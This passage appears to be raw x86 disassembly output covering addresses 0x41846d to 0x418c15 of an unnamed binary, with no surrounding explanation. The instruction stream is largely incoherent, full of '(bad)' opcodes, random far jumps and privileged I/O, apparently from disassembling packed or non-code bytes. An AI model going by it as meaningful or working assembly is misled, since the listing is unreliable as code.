  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	xchg   edx,eax
  41848c:	ins    DWORD PTR es:[edi],dx
  41848d:	mov    edx,0x7d30cc7c
  418492:	jl     0x4184d4
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	push   ecx
  418498:	call   0x72824467
  41849d:	push   esi
  41849e:	sar    DWORD PTR [edi+ebx*2+0x1],cl
  4184a2:	jb     0x4184e1
  4184a4:	lods   eax,DWORD PTR ds:[esi]
  4184a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184a6:	adc    al,0xeb
  4184a8:	std    
  4184a9:	lods   al,BYTE PTR ds:[esi]
  4184aa:	push   0xffffffda
  4184ac:	xor    BYTE PTR [edx-0x79],0xb
  4184b0:	out    dx,eax
  4184b1:	and    esp,edi
  4184b3:	pop    esp
  4184b4:	pop    edx
  4184b5:	cmp    al,0x33
  4184b7:	aam    0xb
  4184b9:	push   edi
  4184ba:	jl     0x418469
  4184bc:	outs   dx,WORD PTR ds:[esi]
  4184be:	sbb    ch,BYTE PTR [esp+ebx*2+0x3ec0b5e8]
  4184c5:	mov    cl,0xc5
  4184c7:	ja     0x40adc805
  4184cd:	adc    DWORD PTR [edi-0x48],ecx
  4184d0:	pusha  
  4184d1:	mov    cl,0x7f
  4184d3:	mov    eax,0xfa37df2
  4184d8:	mov    ebp,0x821b6a92
  4184dd:	xchg   BYTE PTR ds:0x4c1065e0,bl
  4184e3:	mov    dl,0x65
  4184e5:	aam    0x7d
  4184e7:	sbb    al,0x87
  4184e9:	(bad)  
  4184ea:	push   ebp
  4184eb:	mov    ecx,0x9b012802
  4184f0:	js     0x4184c2
  4184f2:	adc    esi,DWORD PTR [ebx-0x297d95c2]
  4184f8:	pop    eax
  4184f9:	push   edx
  4184fa:	fnstsw WORD PTR [ecx*2+0x7c87a879]
  418501:	jno    0x4184e1
  418503:	(bad)  
  418504:	push   cs
  418505:	cs mov ch,bh
  418508:	pop    ebx
  418509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850a:	add    cl,BYTE PTR [edi-0x5695593b]
  418510:	xchg   esi,eax
  418511:	sbb    eax,0x7871cbe8
  418516:	inc    ecx
  418517:	jp     0x4184ac
  418519:	push   ebx
  41851a:	push   0xffffffb3
  41851c:	mov    ecx,ebp
  41851e:	and    al,0xb7
  418520:	in     al,0x87
  418522:	xchg   edx,eax
  418523:	imul   edx,DWORD PTR [esp+ebx*4-0xfa2d28d],0x7819bff4
  41852e:	in     al,dx
  41852f:	jmp    0x8aab:0xa5b2f9ce
  418536:	xchg   ebx,eax
  418537:	sar    DWORD PTR [edx+0x680c044f],0xfc
  41853e:	retf   0xe43c
  418541:	mov    WORD PTR [eax],?
  418543:	pop    edx
  418544:	fdiv   DWORD PTR [edi+0x1c]
  418547:	out    dx,eax
  418548:	cmp    al,0x4e
  41854a:	mov    ch,BYTE PTR ds:[ebx+0x6a9e768d]
  418551:	mov    al,0x84
  418553:	push   edi
  418554:	jle    0x418522
  418556:	or     ebx,esi
  418558:	ss jbe 0x418573
  41855b:	out    dx,eax
  41855c:	dec    edx
  41855d:	je     0x4184f1
  41855f:	jmp    0x52ff92ba
  418564:	cmp    bl,dl
  418566:	test   eax,0x4adfc78a
  41856b:	xchg   BYTE PTR [ebx-0x5a1ad900],bh
  418571:	test   al,0x69
  418573:	jp     0x4185bc
  418575:	out    0xa3,al
  418577:	xor    eax,ecx
  418579:	push   ecx
  41857a:	push   ss
  41857b:	pop    ebx
  41857c:	sub    ebx,0xffffffc1
  41857f:	mov    esi,0xfb1dea44
  418584:	pop    ebx
  418585:	mov    edx,0xec3cd1f4
  41858a:	mov    ah,0x22
  41858c:	adc    esp,DWORD PTR [ebp+0x5c45c8f5]
  418592:	or     dh,BYTE PTR [ebp+0x76]
  418595:	retf   
  418596:	es (bad) 
  418598:	stos   BYTE PTR es:[edi],al
  418599:	push   edx
  41859a:	(bad)  
  41859b:	adc    al,0x46
  41859d:	push   esp
  41859e:	push   0xffffffa0
  4185a0:	sub    DWORD PTR [ecx-0x63],edx
  4185a3:	shr    DWORD PTR [ebp-0x34],1
  4185a6:	dec    ecx
  4185a7:	cmp    BYTE PTR [ebp-0x20],cl
  4185aa:	dec    edx
  4185ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ac:	loopne 0x418608
  4185ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185af:	xlat   BYTE PTR ds:[ebx]
  4185b0:	mov    eax,0x1f22ba94
  4185b5:	lea    ecx,[ecx-0x1f]
  4185b8:	xchg   ebp,eax
  4185b9:	xchg   esi,eax
  4185ba:	sar    BYTE PTR [edx-0x77],1
  4185bd:	fstp   DWORD PTR [eax-0x6b]
  4185c0:	or     bh,BYTE PTR [esi]
  4185c2:	outs   dx,DWORD PTR ds:[esi]
  4185c3:	push   ecx
  4185c4:	push   ecx
  4185c5:	xchg   esp,eax
  4185c6:	fcom   st(7)
  4185c8:	dec    BYTE PTR [edx]
  4185ca:	inc    ebx
  4185cb:	hlt    
  4185cc:	out    dx,eax
  4185cd:	loope  0x418624
  4185cf:	iret   
  4185d0:	out    dx,eax
  4185d1:	das    
  4185d2:	jno    0x418622
  4185d4:	loop   0x418581
  4185d6:	adc    eax,ebp
  4185d8:	mov    ds:0x44063101,al
  4185dd:	pop    ebx
  4185de:	jl     0x4185e4
  4185e0:	dec    ecx
  4185e1:	adc    eax,0xa720db9c
  4185e6:	cmc    
  4185e7:	loopne 0x4185ac
  4185e9:	or     edx,esi
  4185eb:	inc    esi
  4185ec:	inc    edx
  4185ed:	ins    DWORD PTR es:[edi],dx
  4185ee:	push   ebx
  4185ef:	inc    ebp
  4185f0:	adc    eax,0xe0af7fed
  4185f5:	aad    0xf4
  4185f7:	retf   
  4185f8:	aas    
  4185f9:	js     0x4185f8
  4185fb:	or     BYTE PTR [ebx-0x748cd380],dh
  418601:	mov    DWORD PTR [edx+0x1b84ca66],esp
  418607:	fisub  DWORD PTR [eax-0xd]
  41860a:	xor    al,0xe9
  41860c:	sub    DWORD PTR [esi+0xc2330c6],ecx
  418612:	outs   dx,BYTE PTR ds:[esi]
  418613:	pop    ebp
  418614:	or     BYTE PTR [eax+0x45],ah
  418617:	(bad)  
  418618:	adc    al,0xf8
  41861a:	dec    ch
  41861c:	add    eax,0x731a4f3e
  418621:	and    eax,0x49720257
  418626:	and    esi,DWORD PTR [ebp+0x37]
  418629:	test   eax,0xbb835d5
  41862e:	mov    dl,0x2a
  418630:	fwait
  418631:	pop    es
  418632:	add    BYTE PTR [esi-0x35],ah
  418635:	test   al,0xe5
  418637:	pop    es
  418638:	imul   ebp,DWORD PTR ds:0x244aa467,0x6b6addd1
  418642:	xchg   esp,eax
  418643:	into   
  418644:	rol    DWORD PTR [eax+0x52ff0a0c],0xf4
  41864b:	xchg   ecx,eax
  41864c:	xor    al,0x8f
  41864e:	lea    ecx,[ebx+0x42e8c1cf]
  418654:	jbe    0x4186a6
  418656:	push   esp
  418657:	hlt    
  418658:	fidivr DWORD PTR [ecx-0x2c]
  41865b:	push   eax
  41865c:	leave  
  41865d:	rcl    BYTE PTR [esi-0x24412ec],cl
  418663:	popa   
  418664:	cmp    eax,0x9c176839
  418669:	xor    ch,BYTE PTR [ebp-0x18]
  41866c:	mov    eax,0x8f905439
  418671:	iret   
  418672:	add    BYTE PTR [eax+0x50834881],dh
  418678:	mov    dl,0x17
  41867a:	xchg   ecx,eax
  41867b:	out    0x73,al
  41867d:	pop    esp
  41867e:	das    
  41867f:	out    0xec,al
  418681:	and    eax,DWORD PTR [eax+0x7504e306]
  418687:	dec    eax
  418688:	push   ss
  418689:	mov    bh,0x69
  41868b:	pop    ebx
  41868c:	iret   
  41868d:	popa   
  41868e:	retf   
  41868f:	out    dx,eax
  418690:	push   0x49
  418692:	retf   0x773b
  418695:	mov    cl,0x3f
  418697:	mov    al,0xc9
  418699:	call   0x5cf7:0xcfa4151e
  4186a0:	test   DWORD PTR ss:[edx+eax*2+0x22e86069],0x44d42270
  4186ac:	(bad)  
  4186ad:	div    edx
  4186af:	retf   0xb321
  4186b2:	cli    
  4186b3:	xchg   edx,eax
  4186b4:	push   ecx
  4186b5:	mov    ah,0xb0
  4186b7:	bound  ecx,QWORD PTR [esi]
  4186b9:	je     0x418649
  4186bb:	mov    ebx,0xe30877bb
  4186c0:	mov    bh,0xab
  4186c2:	les    edx,FWORD PTR [esi+0x34]
  4186c5:	repnz sbb eax,0x125fc504
  4186cb:	std    
  4186cc:	in     al,dx
  4186cd:	sar    DWORD PTR [edx+ebx*2+0x34],cl
  4186d1:	xchg   al,cl
  4186d3:	inc    edi
  4186d4:	cmp    DWORD PTR [eax-0x2f03f71b],ecx
  4186da:	out    dx,al
  4186db:	sbb    BYTE PTR [ecx+0x74],0x71
  4186df:	mov    eax,ds:0x5317f61e
  4186e4:	inc    edx
  4186e5:	jne    0x4186cf
  4186e7:	test   BYTE PTR [esi-0x4ed024ba],bl
  4186ed:	call   0x325d667f
  4186f2:	sub    DWORD PTR fs:[eax-0x58bfb4bb],0xffffffb5
  4186fa:	call   0xf36f3807
  4186ff:	mov    dh,0x3b
  418701:	lds    ebp,FWORD PTR [ebx+edx*4-0x11907976]
  418708:	or     al,0x3f
  41870a:	inc    edi
  41870b:	cmp    esi,DWORD PTR [ebx]
  41870d:	out    0x2e,eax
  41870f:	pop    ecx
  418710:	ror    DWORD PTR [esi+0x685254cd],1
  418716:	or     al,0xf7
  418718:	mov    BYTE PTR [ecx-0x461fcf93],al
  41871e:	daa    
  41871f:	sub    al,0x88
  418721:	ins    DWORD PTR es:[edi],dx
  418722:	hlt    
  418723:	inc    ebx
  418724:	stos   DWORD PTR es:[edi],eax
  418725:	mov    ebp,0x425988b9
  41872a:	lods   eax,DWORD PTR ds:[esi]
  41872b:	rol    DWORD PTR [ecx],1
  41872d:	scas   eax,DWORD PTR es:[edi]
  41872e:	shl    DWORD PTR [ebx],cl
  418730:	jp     0x41874a
  418732:	fwait
  418733:	xchg   esp,eax
  418734:	pushf  
  418735:	mov    ds:0xf87b6fe2,al
  41873a:	push   ebx
  41873b:	xor    eax,0xb64edeff
  418740:	fwait
  418741:	dec    edi
  418742:	rcr    DWORD PTR [esi],cl
  418744:	je     0x418731
  418746:	pop    ebx
  418747:	mov    ebx,0x7f356952
  41874c:	dec    esp
  41874d:	push   0xb95f2e6b
  418752:	pop    edx
  418753:	fld    QWORD PTR [ecx+0x63]
  418756:	pop    ss
  418757:	inc    ecx
  418758:	add    al,BYTE PTR [esp+ebp*8-0xe]
  41875c:	shl    BYTE PTR [eax],0x1a
  41875f:	sbb    BYTE PTR [ecx-0x1fe5fd7a],cl
  418765:	test   DWORD PTR [esi-0x6c77b41a],edi
  41876b:	lea    esi,[ebp-0x2b]
  41876e:	loop   0x4187ed
  418770:	cmp    al,BYTE PTR [eax+0x116d17af]
  418776:	cmc    
  418777:	aam    0x6e
  418779:	dec    esp
  41877a:	add    al,0x4e
  41877c:	imul   eax,DWORD PTR [eax-0x78aa8602],0x576622d7
  418786:	xchg   dh,dl
  418788:	and    al,BYTE PTR [ebp-0x2eaf1521]
  41878e:	mov    edi,0x7afa00d1
  418793:	ror    BYTE PTR [eax+0x6e],0xfc
  418797:	cmp    DWORD PTR [ecx],0xa33fbbfa
  41879d:	xor    al,0x34
  41879f:	push   es
  4187a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a1:	dec    eax
  4187a2:	jnp    0x418727
  4187a4:	sahf   
  4187a5:	adc    cl,BYTE PTR [esi]
  4187a7:	mov    eax,0x7b147f0e
  4187ac:	add    al,0x18
  4187ae:	ret    
  4187af:	arpl   sp,bx
  4187b1:	adc    ebp,edi
  4187b3:	xchg   BYTE PTR [eax+0xe],ch
  4187b6:	mov    ah,0xe0
  4187b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b9:	pop    ebp
  4187ba:	js     0x4187be
  4187bc:	repz mov dl,0x67
  4187bf:	mov    al,ds:0x3faafb02
  4187c4:	xchg   esp,eax
  4187c5:	jnp    0x41882b
  4187c7:	call   0x1883c6bf
  4187cc:	(bad)  
  4187cd:	mov    al,ds:0x62b4151c
  4187d2:	neg    BYTE PTR [esi+0x5e]
  4187d5:	repnz and BYTE PTR [edi],al
  4187d8:	dec    ecx
  4187d9:	mov    al,0x28
  4187db:	inc    edx
  4187dc:	aad    0x9
  4187de:	pop    ecx
  4187df:	jnp    0x418782
  4187e1:	pop    edi
  4187e2:	or     al,al
  4187e4:	mov    edi,DWORD PTR [eax+0x75e7b054]
  4187ea:	jl     0x418778
  4187ec:	inc    ebp
  4187ed:	jae    0x4187b0
  4187ef:	sbb    dl,BYTE PTR [esi-0x33d46290]
  4187f5:	gs call 0x5ac73721
  4187fb:	sahf   
  4187fc:	push   ds
  4187fd:	cmp    eax,0xa05163cc
  418802:	es daa 
  418804:	ins    DWORD PTR es:[edi],dx
  418805:	inc    esp
  418806:	sub    ah,BYTE PTR ds:0x13b42286
  41880c:	(bad)  
  41880d:	leave  
  41880e:	mov    bh,BYTE PTR [ebx]
  418810:	xlat   BYTE PTR ds:[ebx]
  418811:	sub    BYTE PTR [edi],ah
  418813:	jmp    0x4187f5
  418815:	mov    ebx,0x26c9f681
  41881a:	das    
  41881b:	xchg   ebp,eax
  41881c:	jmp    0x4187e8
  41881e:	fs push ecx
  418820:	pop    esp
  418821:	jle    0x4188a2
  418823:	popf   
  418824:	mov    ah,0x14
  418826:	dec    ebx
  418827:	and    BYTE PTR [edx+0x31],ch
  41882a:	outs   dx,DWORD PTR ds:[esi]
  41882b:	add    eax,0xd3d4fe97
  418830:	pop    ds
  418831:	push   0x3dcec829
  418836:	pop    ebx
  418837:	(bad)  
  418838:	icebp  
  418839:	push   esp
  41883a:	add    esp,DWORD PTR [ebp-0x7d]
  41883d:	push   0x90db1b5
  418842:	pop    ebx
  418843:	xlat   BYTE PTR ds:[ebx]
  418844:	mov    esp,0x74fedfb9
  418849:	retf   
  41884a:	fs dec ecx
  41884c:	add    DWORD PTR [edi-0x380969c7],esi
  418852:	loop   0x4188c2
  418854:	jns    0x4188c6
  418856:	mov    eax,0xfc1eed97
  41885b:	or     BYTE PTR ds:0xbdd27c73,ah
  418861:	imul   ebp,esi,0x79
  418864:	mov    edi,0x90a89393
  418869:	mov    ah,BYTE PTR ds:0x3be3e57c
  41886f:	xor    DWORD PTR [esi],edx
  418871:	ins    DWORD PTR es:[edi],dx
  418872:	mov    ds:0xa3aed963,eax
  418877:	iret   
  418878:	(bad)  [eax]
  41887a:	mul    BYTE PTR [esi+ecx*4]
  41887d:	inc    edi
  41887e:	jge    0x418836
  418880:	add    edx,DWORD PTR [esi+0x72]
  418883:	pop    ebp
  418884:	ins    DWORD PTR es:[edi],dx
  418885:	std    
  418886:	in     al,0xc5
  418888:	add    BYTE PTR [ecx+0x76],cl
  41888b:	fadd   QWORD PTR [ebx+0x7610c7ab]
  418891:	inc    eax
  418892:	bound  ebx,QWORD PTR [ecx-0x440bbd]
  418898:	xchg   edx,eax
  418899:	jp     0x418843
  41889b:	add    eax,0xb979a62
  4188a0:	call   0xcc98:0x4adcc2ce
  4188a7:	mov    es,WORD PTR [eax]
  4188a9:	push   esp
  4188aa:	cdq    
  4188ab:	push   edi
  4188ac:	fistp  QWORD PTR [ecx-0x61]
  4188af:	mov    edi,0x5c6e027b
  4188b4:	shr    DWORD PTR [eax-0x161c1fe8],cl
  4188ba:	cdq    
  4188bb:	std    
  4188bc:	mov    ch,0xf6
  4188be:	shl    DWORD PTR [edi],cl
  4188c0:	jg     0x418889
  4188c2:	or     al,0xe5
  4188c4:	into   
  4188c5:	mov    al,ds:0x7db9cfdb
  4188ca:	clc    
  4188cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188cc:	jb     0x41888f
  4188ce:	and    al,bh
  4188d0:	xor    eax,0x53aaccad
  4188d5:	mov    bh,0x41
  4188d7:	mov    DWORD PTR [edi+0x4be19be9],ebx
  4188dd:	pop    es
  4188de:	cli    
  4188df:	push   ecx
  4188e0:	push   0xaa7143ce
  4188e5:	ror    BYTE PTR [edx],0xf1
  4188e8:	cmp    ecx,DWORD PTR ds:[ebx+0x15]
  4188ec:	inc    eax
  4188ed:	push   es
  4188ee:	dec    eax
  4188ef:	sub    esi,ecx
  4188f1:	xchg   ecx,eax
  4188f2:	ror    dh,cl
  4188f4:	cmp    BYTE PTR [edx+0x7648d391],ah
  4188fa:	hlt    
  4188fb:	jmp    0x418955
  4188fd:	inc    esi
  4188fe:	and    edi,edi
  418900:	(bad)  
  418901:	jne    0x418896
  418903:	test   al,0x56
  418905:	pop    ecx
  418906:	push   esp
  418907:	add    eax,edi
  418909:	aad    0x7c
  41890b:	lds    edi,FWORD PTR [eax-0x7e]
  41890e:	es cld 
  418910:	es jae 0x418922
  418913:	push   edi
  418914:	sub    DWORD PTR [ecx-0x67],edx
  418917:	pop    edx
  418918:	fwait
  418919:	sbb    BYTE PTR [edx+ecx*8-0x1f],bl
  41891d:	mov    ah,0xb1
  41891f:	dec    esi
  418920:	fdiv   QWORD PTR [edx+0x4b]
  418923:	xor    dh,dh
  418925:	pusha  
  418926:	mov    al,0x6e
  418928:	(bad)
  41892b:	retf   
  41892c:	(bad)  
  41892d:	pop    esi
  41892e:	push   ecx
  41892f:	inc    esi
  418930:	jnp    0x41899f
  418932:	jnp    0x4188cb
  418934:	(bad)  [ebx+0x4e]
  418937:	push   eax
  418938:	or     esi,DWORD PTR [edi]
  41893a:	fsubp  st(3),st
  41893c:	sub    DWORD PTR [edi],edx
  41893e:	or     al,0x7c
  418940:	push   esi
  418941:	cmp    dh,BYTE PTR [ebx-0x668a5a02]
  418947:	std    
  418948:	inc    edx
  418949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41894a:	pop    esi
  41894b:	(bad)  
  41894c:	adc    DWORD PTR [edi+0x39db1be3],ebx
  418952:	jbe    0x41892d
  418954:	cmp    al,0x5d
  418956:	retf   
  418957:	loop   0x418970
  418959:	rol    DWORD PTR [esi+0x17141654],1
  41895f:	xchg   edx,eax
  418960:	adc    al,0x87
  418962:	leave  
  418963:	and    BYTE PTR [edi],bl
  418965:	xor    dl,ch
  418967:	int3   
  418968:	cmp    BYTE PTR [ecx-0x37],bl
  41896b:	das    
  41896c:	inc    ecx
  41896d:	dec    edi
  41896e:	jae    0x418978
  418970:	mov    eax,ds:0x90221d60
  418975:	cmp    DWORD PTR [ebx],edx
  418977:	sub    BYTE PTR [eax],ch
  418979:	xor    al,0x24
  41897b:	les    esi,FWORD PTR ds:0x9f2c276d
  418981:	retf   0xd6e4
  418984:	mov    bh,0x50
  418986:	xchg   ebx,eax
  418987:	xchg   DWORD PTR [edx-0x65de08d4],esp
  41898d:	xchg   DWORD PTR [esi],esi
  41898f:	xor    DWORD PTR [esi+0x26],0xffffffce
  418993:	add    DWORD PTR [edx+0x2c],eax
  418996:	ins    BYTE PTR es:[edi],dx
  418997:	sub    eax,0xdf7d1073
  41899c:	call   FWORD PTR [edx+0x5a]
  41899f:	jo     0x418986
  4189a1:	sub    cl,BYTE PTR [ebx-0x19]
  4189a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189a5:	fisttp WORD PTR [ebx-0x67]
  4189a8:	xchg   edx,eax
  4189a9:	push   DWORD PTR [eax]
  4189ab:	xor    ah,BYTE PTR [esi]
  4189ad:	aas    
  4189ae:	out    0x66,al
  4189b0:	adc    ch,ch
  4189b2:	loopne 0x4189e2
  4189b4:	fldenv [ecx-0x2cf84ab4]
  4189ba:	mov    DWORD PTR [edi-0x74],eax
  4189bd:	and    BYTE PTR ds:0x210b02f6,ah
  4189c3:	fwait
  4189c4:	xor    DWORD PTR [ebx],eax
  4189c6:	mov    gs,WORD PTR ds:0xafd017ad
  4189cc:	stc    
  4189cd:	fdivrp st(2),st
  4189cf:	fadd   QWORD PTR ds:0x3633f1a5
  4189d5:	scas   al,BYTE PTR es:[edi]
  4189d6:	retf   
  4189d7:	stos   DWORD PTR es:[edi],eax
  4189d8:	imul   ecx,ecx,0x1bed66fb
  4189de:	jecxz  0x41896e
  4189e0:	mov    gs,eax
  4189e2:	xor    DWORD PTR [edx],ecx
  4189e4:	ss aaa 
  4189e6:	xlat   BYTE PTR ds:[ebx]
  4189e7:	adc    ah,BYTE PTR [ecx-0x4]
  4189ea:	inc    eax
  4189eb:	cmp    al,0xc0
  4189ed:	mov    ah,0x1a
  4189ef:	mov    al,0xa3
  4189f1:	xchg   edx,eax
  4189f2:	xlat   BYTE PTR ds:[ebx]
  4189f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f4:	in     al,0x78
  4189f6:	stc    
  4189f7:	data16 in al,0x3c
  4189fa:	loope  0x4189b4
  4189fc:	add    al,0x8e
  4189fe:	push   ss
  4189ff:	and    DWORD PTR [ebx+0x21bfe6a6],edx
  418a05:	xchg   edi,eax
  418a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a07:	sub    DWORD PTR [eax+0x77],ecx
  418a0a:	in     eax,dx
  418a0b:	mov    dl,0xbd
  418a0d:	or     eax,0x4602cb96
  418a12:	jg     0x418a54
  418a14:	sti    
  418a15:	aas    
  418a16:	les    edx,FWORD PTR [esi+0x1b]
  418a19:	inc    esp
  418a1a:	and    eax,0x8dfd4698
  418a1f:	pop    ecx
  418a20:	push   ds
  418a21:	inc    ebx
  418a22:	add    bh,BYTE PTR [edi+0x4f]
  418a25:	mov    ecx,0x53243840
  418a2a:	popa   
  418a2b:	push   ebx
  418a2c:	sub    esi,ebx
  418a2e:	mov    bl,0x54
  418a30:	push   eax
  418a31:	mov    dh,0x85
  418a33:	and    al,0xab
  418a35:	cmovae eax,DWORD PTR [ebp-0x63]
  418a39:	jp     0x418a22
  418a3b:	out    dx,eax
  418a3c:	and    eax,0x633a34e5
  418a41:	mov    ah,0xad
  418a43:	and    DWORD PTR [ecx],esp
  418a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a46:	inc    ebp
  418a47:	dec    ebx
  418a48:	(bad)  
  418a49:	cli    
  418a4a:	adc    ebp,DWORD PTR [edi+0x71128806]
  418a50:	xchg   esi,eax
  418a51:	mov    ds:0xf3533ca9,al
  418a56:	fwait
  418a57:	(bad)  
  418a58:	mov    ah,0x31
  418a5a:	js     0x418ad0
  418a5c:	hlt    
  418a5d:	jp     0x418a84
  418a5f:	fwait
  418a60:	ins    BYTE PTR es:[edi],dx
  418a61:	popf   
  418a62:	dec    edx
  418a63:	or     eax,0x3637891f
  418a68:	mov    ah,0x7c
  418a6a:	pop    ss
  418a6b:	js     0x418a80
  418a6d:	jo     0x418a33
  418a6f:	sub    DWORD PTR [ecx],ebp
  418a71:	add    al,0xc3
  418a73:	xchg   esi,eax
  418a74:	or     DWORD PTR [ecx],ecx
  418a76:	inc    DWORD PTR [ecx+0x56]
  418a79:	call   0x7013:0x5a55cb3e
  418a80:	stc    
  418a81:	and    DWORD PTR [edi-0x3ac9b5f7],edx
  418a87:	push   ecx
  418a88:	mov    al,ds:0x1ef903f0
  418a8d:	nop
  418a8e:	xchg   ebx,eax
  418a8f:	sub    DWORD PTR [eax+0x6c6ccaa1],edi
  418a95:	pop    esi
  418a96:	out    0x77,al
  418a98:	adc    bh,bl
  418a9a:	mov    ebp,0xc4d63960
  418a9f:	cwde   
  418aa0:	jbe    0x418a27
  418aa2:	or     bh,cl
  418aa4:	dec    eax
  418aa5:	push   ebp
  418aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa7:	loope  0x418a80
  418aa9:	dec    esp
  418aaa:	icebp  
  418aab:	pop    ecx
  418aac:	and    ch,bh
  418aae:	stos   BYTE PTR es:[edi],al
  418aaf:	xor    bl,BYTE PTR [edi+0x76]
  418ab2:	outs   dx,BYTE PTR ds:[esi]
  418ab3:	(bad)  
  418ab4:	pop    esi
  418ab5:	and    al,0xe4
  418ab7:	jb     0x418ad7
  418ab9:	add    DWORD PTR [esi+0x67],edx
  418abc:	push   0x79022068
  418ac1:	inc    esp
  418ac2:	in     al,dx
  418ac3:	push   cs
  418ac4:	xchg   BYTE PTR ds:0x31f571fb,al
  418aca:	div    BYTE PTR [eax+0x69]
  418acd:	lods   eax,DWORD PTR ds:[esi]
  418ace:	cmp    BYTE PTR [eax],0x84
  418ad1:	mov    esp,0xae6d15ff
  418ad6:	sahf   
  418ad7:	loop   0x418b1d
  418ad9:	inc    esp
  418ada:	lock shl BYTE PTR [esi-0x1b],cl
  418ade:	in     eax,0x36
  418ae0:	dec    ebx
  418ae1:	sub    esi,DWORD PTR [edx-0x3]
  418ae4:	xor    dl,ah
  418ae6:	add    esp,ebx
  418ae8:	neg    DWORD PTR [ebx]
  418aea:	aas    
  418aeb:	jno    0x418a8c
  418aed:	cmp    al,0xd9
  418aef:	pop    edi
  418af0:	mov    dl,0x93
  418af2:	cld    
  418af3:	sbb    al,0x17
  418af5:	mov    dl,0x90
  418af7:	retf   0xec0a
  418afa:	push   ss
  418afb:	pop    ecx
  418afc:	fdivr  QWORD PTR [eax]
  418afe:	and    esi,DWORD PTR [edx]
  418b00:	(bad)  
  418b01:	(bad)  
  418b02:	fnstcw WORD PTR [edi+edx*4+0x3a2b0a1f]
  418b09:	jg     0x418b06
  418b0b:	jno    0x418b87
  418b0d:	retf   0xeda4
  418b10:	lds    edx,FWORD PTR [edi-0x46]
  418b13:	mov    al,0x21
  418b15:	clc    
  418b16:	fsub   DWORD PTR [ecx-0x114c2b09]
  418b1c:	xor    cl,dh
  418b1e:	mov    ch,0x39
  418b20:	xchg   edi,eax
  418b21:	mov    dl,0x74
  418b23:	daa    
  418b24:	and    DWORD PTR [ecx+ebp*1-0x7e],eax
  418b28:	mov    bl,0x4f
  418b2a:	cdq    
  418b2b:	fs xchg edi,eax
  418b2d:	dec    ebx
  418b2e:	inc    edi
  418b2f:	dec    edx
  418b30:	pop    esp
  418b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b32:	xor    ebx,esp
  418b34:	adc    bl,dh
  418b36:	(bad)  
  418b37:	cmp    DWORD PTR [eax],esp
  418b39:	arpl   WORD PTR [edx],si
  418b3b:	adc    eax,0xf05f92a9
  418b40:	div    edi
  418b42:	jge    0x418ace
  418b44:	shl    DWORD PTR [ecx-0x46],0x4
  418b48:	inc    ecx
  418b49:	adc    BYTE PTR [edx],bh
  418b4b:	pop    eax
  418b4c:	mov    dh,0xef
  418b4e:	add    eax,0x1b76bb14
  418b53:	xor    cl,BYTE PTR [edx]
  418b55:	push   ebp
  418b56:	push   ds
  418b57:	mov    edi,0xcc927be5
  418b5c:	dec    eax
  418b5d:	xor    eax,0x1a613386
  418b62:	inc    edi
  418b63:	(bad)  
  418b64:	out    0x8e,al
  418b66:	(bad)  
  418b67:	cld    
  418b68:	loopne 0x418b45
  418b6a:	mov    edx,cs
  418b6c:	mov    eax,ds:0x366eebea
  418b71:	test   DWORD PTR [eax],ebx
  418b73:	add    DWORD PTR [edi+0x79],eax
  418b76:	repz xor DWORD PTR [ecx+0x2a],eax
  418b7a:	sub    dl,0xa9
  418b7d:	imul   ecx,DWORD PTR [esi+0x14],0x32
  418b81:	mov    edi,0x1b32bae
  418b86:	mov    eax,ds:0xa5d3af04
  418b8b:	adc    DWORD PTR [esi+0x27],eax
  418b8e:	lock sbb esp,esi
  418b91:	add    BYTE PTR ds:0x74642fb3,ch
  418b97:	and    al,0xa5
  418b99:	iret   
  418b9a:	and    eax,0x62d86874
  418b9f:	jmp    0x239:0x83d5bc29
  418ba6:	xor    al,0x7f
  418ba8:	xlat   BYTE PTR ds:[ebx]
  418ba9:	cwde   
  418baa:	sbb    esi,DWORD PTR [edx]
  418bac:	outs   dx,BYTE PTR ds:[esi]
  418bad:	imul   eax,DWORD PTR [eax-0xa],0xd9c5853
  418bb4:	dec    esp
  418bb5:	mov    ?,WORD PTR [ecx-0x227cf9e1]
  418bbb:	pop    esi
  418bbc:	sbb    ebx,DWORD PTR [edi-0x5f4dd29a]
  418bc2:	dec    eax
  418bc3:	retf   
  418bc4:	push   cs
  418bc5:	pop    eax
  418bc6:	mov    esp,0x2cd6fd2c
  418bcb:	push   esi
  418bcc:	xor    al,0xf6
  418bce:	sbb    al,0x65
  418bd0:	or     eax,0x4cfd0056
  418bd5:	or     DWORD PTR [esi-0x4bf58f81],0x3d3db5cd
  418bdf:	pop    edi
  418be0:	cmp    dh,BYTE PTR [esi]
  418be2:	jecxz  0x418c52
  418be4:	pop    edx
  418be5:	std    
  418be6:	test   esp,edi
  418be8:	(bad)  
  418be9:	mov    ch,0xcd
  418beb:	loope  0x418b77
  418bed:	dec    ebx
  418bee:	enter  0xf74d,0x23
  418bf2:	ja     0x418c73
  418bf4:	pop    ss
  418bf5:	xor    BYTE PTR [edi],0xf3
  418bf8:	pop    esp
  418bf9:	int3   
  418bfa:	xchg   ecx,eax
  418bfb:	ret    
  418bfc:	adc    al,0x6d
  418bfe:	mov    BYTE PTR ss:[edi],dh
  418c01:	ja     0x418c71
  418c03:	out    dx,al
  418c04:	jl     0x418bad
  418c06:	cmp    DWORD PTR [esi+0x18],0x8a5fbbda
  418c0d:	jnp    0x418bda
  418c0f:	test   DWORD PTR ds:0x5a23c913,ebx
  418c15:	mov    esi,0x5d88980c
